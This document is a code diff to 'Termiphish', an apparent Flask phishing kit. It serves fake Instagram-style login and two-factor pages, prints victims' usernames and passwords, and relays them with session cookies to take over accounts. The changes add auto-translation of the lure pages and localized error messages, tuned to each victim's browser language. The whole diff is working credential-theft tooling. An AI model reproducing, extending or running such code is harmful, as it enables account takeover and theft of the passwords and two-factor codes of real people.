@@ -26,7 +26,8 @@ def setup():
         "requests",
         "toml",
         "device-detector",
-        "geopy"
+        "geopy",
+        "deep-translator"
     ]
     
     for package in packages:
@@ -91,6 +92,8 @@ try:
     import toml
     from device_detector import SoftwareDetector
     from device_detector import DeviceDetector
+    from deep_translator import GoogleTranslator
+    #import twofa_translator
 except ModuleNotFoundError:
     # Ukončení animace na konci try
     stop_event.set()
@@ -134,8 +137,10 @@ ___________                  .__       .__    .__       .__
              \/            \/   |__|        \/        \/     \/   
 """
     print(BLUE + banner + RESET)
-    print(CYAN + "Welcome to Termiphish!", "V1.3 by slizak_jan" + RESET)
-    print(GREEN + "=================================" + RESET)
+    print(CYAN + "Welcome to Termiphish!", "V1.4 BETA by slizak_jan" + RESET)
+    print(GREEN + "=================================" + RESET, RED + "BETA VERSION!" + RESET)
+    print(BLUE + "INFO: Location authentication template translation is missing!" + RESET)
+    print(BLUE + "Intensive testing will be soon" + RESET)
 
 def readable_time(timestamp):
     # Převod na sekundy (milisekundy / 1000)
@@ -216,6 +221,10 @@ get_gps_location = True
 
 allow_multiple_two_factor = False
 
+texts_file = "texts.toml"
+
+default_language = "en-US"
+
 # JS redirect payload
 js_redirect_script = """
 <script>
@@ -261,9 +270,9 @@ def load_config(config_file='config.toml'):
         config = toml.load(config_file)
         #print("Konfigurace načtena:", config)
     except FileNotFoundError:
-        print(f"Konfigurační soubor {config_file} nenalezen. Vytvořte jej a nastavte správné hodnoty.")
+        print(RED + f"Config file {config_file} not found. Create one and add required values." + RESET)
     except toml.TomlDecodeError as e:
-        print(f"Chyba při dekódování {config_file}: {e}")
+        print(RED + f"Error while decoding {config_file}: {e}" + RESET)
 
 
 def get_server_config():
@@ -384,6 +393,11 @@ def user_visited(data):
         session_id = data['sessionID']
 
         #print("Fetching cookies")
+        try:
+            if user_data_storage[session_id]['cookies'] == 'fetching':
+                return
+        except KeyError:
+            pass
 
         # Simulace získání cookies (nahraďte api.get_cookies skutečnou implementací)
         try:
@@ -428,6 +442,9 @@ def index():
     if 'request_location' in session:
         if session['request_location'] == True:
             return redirect('/accounts/login/location_authentication')
+        
+    lang = request.headers.get('Accept-Language')
+    session['language'] = lang
 
     timestamp = int(time.time() * 1000)  # Aktuální čas v milisekundách
     user_agent = request.headers.get('User-Agent')
@@ -578,15 +595,24 @@ def handle_screen_size():
 
 @app.route('/api/dyn_login')
 def dyn_login():
+    lang = request.headers.get('Accept-Language')
+    #lang = language_code.split('-')[0]  # Získání jazyka
+    #print(lang)
+    #language_code = language_code.split(',')[0]  # Získání jazyka
+    #language_code 
     color_scheme = request.headers.get('User-Color-Scheme', 'default')
     session['color-scheme'] = color_scheme
     #print(color_scheme)
+    lang = lang.split(',')[0]
+    #print(lang)
+    translated_text = get_translation(lang)
+    #print(translated_text)
     if color_scheme == 'dark':
-        return render_template('dyn_dark_login.html')
+        return render_template('dyn_dark_login.html', texts=translated_text)
     elif color_scheme == 'light':
-        return render_template('dyn_light_login.html')
+        return render_template('dyn_light_login.html', texts=translated_text)
     else:
-        return render_template('dyn_light_login.html')
+        return render_template('dyn_light_login.html', texts=translated_text)
 
 
 @app.route('/api/login', methods=['POST'])
@@ -600,13 +626,16 @@ def login_api():
     
     if 'logged' in session:
         if session['logged'] == True:
-            return logged_in(session)    
+            return logged_in(session)
         
     data = request.json
     username = data.get('username')
     password = data.get('password')
     timestamp = int(time.time() * 1000)
     user_agent = request.headers.get('User-Agent')
+    lang = session.get('language', default_language)  # Výchozí jazyk je angličtina
+    #print(lang)
+    lang = lang.split(',')[0]
     
     print(BLUE + "\nReceived data from:")
     print("----------------------------------------")
@@ -614,9 +643,12 @@ def login_api():
     print(f"Session ID: {session['sessionID']}")
     print(f"Username: {username}")
     print(f"Password: {password}")
-    if user_data_storage[session['sessionID']]['ipaddress'] != None:
-        ipaddress = user_data_storage[session['sessionID']]['ipaddress']
-        print("IP: ", ipaddress)
+    try:
+        if user_data_storage[session['sessionID']]['ipaddress'] != None:
+            ipaddress = user_data_storage[session['sessionID']]['ipaddress']
+            print("IP: ", ipaddress)
+    except KeyError:
+        print("IP: Unknown")
     print("Timestamp: ", readable_time(timestamp))
     print("----------------------------------------\n" + RESET)
     
@@ -638,12 +670,13 @@ def login_api():
             response, tokens = api.login(username, password, user_agent, user_data_storage[session['sessionID']]['cookies'])
         #print(response)
         #response, tokens = api.login(username, password, user_agent, None)
+        #print(response)
         response_data = response[0]#.json()
 
         if response_data.get('authenticated') is False:
             print(RED + "INVALID" + RESET)
             return jsonify({
-                'message': "Sorry, your password was incorrect. Please double-check your password.",
+                'message': get_error_by_code(lang, "login.errors", "E2"), # "Sorry, your password was incorrect. Please double-check your password."
                 'redirect': "",
                 'status': "fail"
             })
@@ -714,8 +747,22 @@ def login_api():
             })
         elif response_data.get('message') == 'checkpoint_required':
             print(RED + "Checkpoint is required, cant login" + RESET)
+            #return redirect(response_data.get('checkpoint_url'))
+            #return jsonify({
+            #    'message': "",
+            #    'redirect': response_data.get('checkpoint_url'),
+            #    'status': "success"
+            #}) 
             return jsonify({
-                'message': "Unknows error appiered while loging in, please try it later or try different account.",
+                'message': get_error_by_code(lang, "login.errors", "E1"), # "Unknows error appiered while loging in, please try it later or try different account."
+                'redirect': "",
+                'status': "fail"
+            }) # get_error_from_file(file_path, category, identifier)
+        elif response_data.get('message') == '' and response_data.get('status') == 'fail':
+            print(RED + "INVALID" + RESET)
+            print(RED + "Unknown Error appiered, no error messsage returned!!\nWrong password was showed as an error on user page." + RESET)
+            return jsonify({
+                'message': get_error_by_code(lang, "login.errors", "E2"), # "Sorry, your password was incorrect. Please double-check your password."
                 'redirect': "",
                 'status': "fail"
             })
@@ -725,13 +772,74 @@ def login_api():
     except Exception as e:
         print(RED + f"Error in login API: {e}" + RESET)
         return jsonify({
-                'message': "Došlo k chybě při odesílání dat.",
+                'message': get_error_by_code(lang, "login.errors", "E3"),
                 'redirect': "",
                 'status': "fail"
             })
+    
+def get_error_by_code(language_code, category, error_code, default_language=default_language):
+    """
+    Získá chybovou zprávu na základě chybového kódu z TOML souboru.
+    
+    :param language_code: Kód jazyka (např. "cs-CZ").
+    :param category: Kategorie, například "login.errors".
+    :param error_code: Kód chyby (např. "E1").
+    :param default_language: Výchozí jazyk, pokud zadaný jazyk neexistuje.
+    :return: Chybová zpráva nebo None, pokud se kód nenajde.
+    """
+    def load_toml_file(lang_code):
+        file_path = os.path.join("lang", f"{lang_code}.toml")
+        if os.path.exists(file_path):
+            return toml.load(file_path)
+        return None
+
+    # Načíst data pro zadaný jazyk
+    data = load_toml_file(language_code)
+
+    # Pokud jazyk neexistuje, použije se výchozí jazyk
+    if data is None:
+        #print(f"Jazykový soubor {language_code} neexistuje. Používá se výchozí jazyk {default_language}.")
+        data = load_toml_file(default_language)
+
+    # Pokud neexistuje ani výchozí jazyk, vrátit chybu
+    if data is None:
+        if os.path.exists(texts_file):
+            data = toml.load(texts_file)
+        #print(f"Chyba: Nelze najít jazykový soubor {default_language}.")
+        return None
+
+    # Navigace do kategorie (např. "login.errors")
+    keys = category.split('.')
+    current_section = data
+    for key in keys:
+        if key in current_section:
+            current_section = current_section[key]
+        else:
+            return None  # Kategorie neexistuje
+
+    # Pokud se `error_code` nachází jako klíč, vrátí odpovídající zprávu
+    return current_section.get(error_code, None)
+
+@app.route("/api/script")
+def load_script_api():
+    # Příklad jazyka uloženého v session
+    lang = session.get('language', default_language)  # Výchozí jazyk je angličtina
+    #print(lang)
+    lang = lang.split(',')[0]
+    #print(lang)
+    translated_text = get_translation(lang)
+
+    # Vykreslení dynamického JS souboru
+    response = app.response_class(
+        response=render_template("js/script.js", texts=translated_text),
+        status=200,
+        mimetype="application/javascript"
+    )
+    return response
 
 @app.route('/accounts/login/two_factor')
 def two_factor():
+    lang = request.headers.get('Accept-Language')
     if 'logged' in session:
         if session['logged'] == True:
             return logged_in(session)
@@ -765,15 +873,17 @@ def two_factor():
         sessionid = session['sessionID']
     except:
         return redirect("/")
+
+    translated_text = get_translation(lang)
     #print(sessionid)
     color_scheme = session.get('color-scheme', 'default')
     #print(color_scheme)
     if color_scheme == 'dark':
-        return render_template('two_factor_dark.html')
+        return render_template('two_factor_dark.html', texts=translated_text)
     elif color_scheme == 'light':
-        return render_template('two_factor_light.html')
+        return render_template('two_factor_light.html', texts=translated_text)
     else:
-        return render_template('two_factor_light.html')
+        return render_template('two_factor_light.html', texts=translated_text)
     return render_template('two_factor.html')
 
 @app.route('/api/two_factor', methods=["POST"])
@@ -861,18 +971,78 @@ def two_factor_api():
                 }), 200
         elif response_data.get('status') == 'fail':
             print(RED + "Code is invalid" + RESET)
+            message = response_data.get('message')
+            error_key = find_error_key_twofa(load_texts(texts_file), message)
+            #print(LIGHT_MAGENTA + error_key + RESET)
+            try:
+                if error_key == None:
+                    error_key = "E6"
+                    print(YELLOW + "Please report this as 'ErrorL1'!!: {" + message + "}" + RESET)
+                    error = find_error_by_key_twofa(load_translations(session.get('language', default_language)), error_key)
+                    if error == None:
+                        error = find_error_by_key_twofa(load_texts(texts_file), error_key)
+                        print(YELLOW + "Error for this language not found! Report this as 'ErrorL3'!" + f"\n{lang}, {message}" + RESET)
+                        return jsonify({
+                            'message': error,
+                            'status': response_data.get('status'),
+                            'redirect': ''
+                        })
+                    return jsonify({
+                        'message': error,
+                        'status': response_data.get('status'),
+                        'redirect': ''
+                    })
+                lang = session.get('language', default_language)
+                lang = lang.split(',')[0]
+                #print(lang)
+                try:
+                    error = find_error_by_key_twofa(load_translations(lang), error_key)
+                except FileNotFoundError:
+                    try:
+                        error = find_error_by_key_twofa(load_translations(default_language), error_key)
+                    except FileNotFoundError:
+                        error = find_error_by_key_twofa(load_texts(texts_file), error_key)
+                        print(YELLOW + "Error for this language not found! Report this as 'ErrorL3'!" + f"\n{lang}, {message}" + RESET)
+                #print(LIGHT_MAGENTA + error + RESET)
+                if error == None:
+                    error = find_error_by_key_twofa(load_texts(texts_file), error_key)
+                    return jsonify({
+                        'message': error,
+                        'status': response_data.get('status'),
+                        'redirect': ''
+                    })
+                return jsonify({
+                    'message': error,
+                    'status': response_data.get('status'),
+                    'redirect': ''
+                })
+            except Exception as e:
+                #print(e)
+                print(YELLOW + f"Report this as 'ErrorL2' please!! {message}" + RESET)
+                print(YELLOW + f"\nMessage was not found in any language pack,\nbasic invalid code response was showed!\n" + RESET)
+                return jsonify({
+                    'message': "Please check the security code and try again.",
+                    'status': response_data.get('status'),
+                    'redirect': ''
+                })
+        else:
             return jsonify({
-                'message': response_data.get('message'),
+                'message': "error",
                 'status': response_data.get('status'),
                 'redirect': ''
             })
+
 
     except Exception as e:
         print(RED + f"Error in two-factor API: {e}" + RESET)
         if e == 'cookies':
             return redirect('/')
 
-    return render_template('two_factor.html')
+    return jsonify({
+                'message': response_data.get('message'),
+                'status': response_data.get('status'),
+                'redirect': ''
+            })
 
 @app.route("/api/v1/web/accounts/send_two_factor_login_sms", methods=["POST"])
 def send_two_factor_sms_api():
@@ -1120,6 +1290,43 @@ def ensure_directory_exists(path):
     if not os.path.exists(path):
         os.makedirs(path)
 
+def find_error_key_twofa(texts, target_error):
+    """
+    Prohledá 'two_factor.errors' v texts a vrátí klíč chyby, pokud je nalezena.
+    Pokud chyba není nalezena, vrátí None.
+    
+    :param texts: Načtené texty ve formátu JSON.
+    :param target_error: Hledaná chyba.
+    :return: Klíč chyby nebo None.
+    """
+    # Projít 'two_factor.errors'
+    errors = texts.get('two_factor', {}).get('errors', {})
+
+    # Projít každou chybu a porovnat s hledaným textem
+    for key, value in errors.items():
+        if target_error in value:
+            return key
+    
+    # Pokud nebyla nalezena žádná shoda, vrátit None
+    return None
+
+def find_error_by_key_twofa(texts, key):
+    """
+    Prohledá 'two_factor.errors' podle klíče a vrátí odpovídající text chyby.
+
+    :param texts: Načtené texty ve formátu JSON.
+    :param key: Klíč chyby, kterou hledáme.
+    :return: Text chyby pokud je nalezen, jinak None.
+    """
+    # Projít 'two_factor.errors' podle klíče
+    errors = texts.get('two_factor', {}).get('errors', {})
+
+    # Pokud klíč existuje, vrátíme odpovídající text chyby
+    if key in errors:
+        return errors[key]
+    
+    # Pokud klíč není nalezen, vrátíme None
+    return None
 
 # Stáhne obsah <head> z URL
 def fetch_head_from_url(url, endpoint):
@@ -1205,6 +1412,98 @@ def stop_server(server_id):
         server_config.update({"host": None, "port": None, "server_id": None, "running": False})
     else:
         print(RED + "Invalid server ID or no server is running." + RESET)
+
+# Načtení souboru texts.toml
+def load_texts(file_path):
+    return toml.load(file_path)
+
+def load_translations(language_code):
+    file_path = f"lang/{language_code}.toml"
+    try:
+        return toml.load(file_path)
+    except FileNotFoundError:
+        raise FileNotFoundError
+
+# Načtení textů pro konkrétní jazyk (např. ruština)
+#translated_texts = load_translations('ru') # Test
+
+def get_translation(language_code):
+    #print(YELLOW + language_code + RESET)
+    language_code = language_code.split(',')[0]  # Získání jazyka
+    #print(YELLOW + language_code + RESET)
+    try:
+        #print(language_code)
+        #language_code = "cs-CZ"
+        translated_text = load_translations(language_code)
+    except Exception as e:
+        #print(e)
+        thread = threading.Thread(target=process_language, args=(language_code,))
+        thread.start()
+        try:
+            translated_text = load_translations(default_language)
+        except Exception as e:
+            #print(e)
+            thread_one = threading.Thread(target=process_language, args=(default_language,))
+            thread_one.start()
+            translated_text = load_texts(texts_file)
+    return translated_text
+
+def process_language(language_code):
+    print(YELLOW + f"Proccessing {language_code}" + RESET)
+    target_language = language_code.split('-')[0]  # Získání jazyka
+    #print(target_language)
+    #language_code = language_code.split(',')[0]  # Získání jazyka
+    translated_text = translate_texts(load_texts(texts_file), target_language)
+    save_translated_texts(f"lang/{language_code}.toml", translated_text)
+    #translated_text = twofa_translator.translate_twofa(translated_text, target_language)
+    #save_translated_texts(f"lang/{language_code}.toml", translated_text)
+    print(MAGENTA + f"\nNew language pack was created for {target_language}\n" + RESET)
+
+
+# Překlad textů
+def translate_texts(texts, target_language):
+    translated_texts = {}
+
+    for category, category_values in texts.items():
+        translated_category = {}
+
+        # Předpokládáme, že kategorie obsahují 'errors' a 'descriptions', které jsou slovníky
+        for subcategory, subcategory_values in category_values.items():
+            # Pokud kategorie je 'two_factor', přeskočíme 'method_names' a 'change_decriptions'
+            #if category == 'two_factor' and subcategory in ['change_decriptions', 'method_names']:
+            #    print(f"    Skipping: {subcategory}")  # Debug: Informace o přeskočení
+            #    # Přeskočíme tuto podkategorii a necháme ji beze změny
+            #    translated_category[subcategory] = subcategory_values
+            #    continue
+
+            if isinstance(subcategory_values, dict):
+                translated_subcategory = {}
+                for key, value in subcategory_values.items():
+                    try:
+                        # Přelož text
+                        translated_text = GoogleTranslator(source='auto', target=target_language).translate(value)
+                        translated_subcategory[key] = translated_text
+                    except Exception as e:
+                        print(RED + f"Error while translating text: '{value}': {str(e)}" + RESET)
+                        translated_subcategory[key] = value  # Pokud dojde k chybě, ponecháme původní text
+                translated_category[subcategory] = translated_subcategory
+            else:
+                # Pokud hodnota není slovník (ale text), rovnou ji přeložíme
+                try:
+                    translated_text = GoogleTranslator(source='auto', target=target_language).translate(subcategory_values)
+                    translated_category[subcategory] = translated_text
+                except Exception as e:
+                    print(RED + f"Error while translating text: '{subcategory_values}': {str(e)}" + RESET)
+                    translated_category[subcategory] = subcategory_values
+        translated_texts[category] = translated_category
+
+    return translated_texts
+
+# Uložení přeložených textů do nového TOML souboru ve složce lang
+def save_translated_texts(file_path, texts):
+    os.makedirs(os.path.dirname(file_path), exist_ok=True)  # Vytvoří složku lang pokud neexistuje
+    with open(file_path, 'w', encoding='utf-8') as file:
+        toml.dump(texts, file)
 
 
 # Pomocné funkce
